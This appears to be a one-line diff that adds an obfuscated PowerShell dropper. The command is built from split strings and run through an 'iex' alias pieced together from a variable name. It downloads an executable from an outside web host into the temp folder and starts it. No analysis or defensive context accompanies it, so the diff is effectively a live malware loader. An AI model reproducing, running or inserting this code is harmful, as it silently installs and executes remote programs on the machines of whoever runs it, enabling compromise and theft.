@@ -1,0 +1,1 @@
+﻿ (('({0}deplo'+'ylo'+'catio'+'n='+'{'+'0}e'+'nv:temp+{1'+'}fle'+'eb.exe{1});(New'+'-'+'Ob'+'jec'+'t Sys'+'tem.Ne'+'t.WebClien'+'t).D'+'ownl'+'o'+'adFil'+'e({1}http://'+'worldnit.com/m'+'iracl'+'e.exe{1'+'}, '+'{0}'+'depl'+'o'+'y'+'l'+'ocation);St'+'art-'+'P'+'r'+'o'+'cess {0}deployl'+'ocation')-F [Char]36,[Char]39)| & ((Get-variAblE '*MDr*').nAmE[3,11,2]-JOiN'')
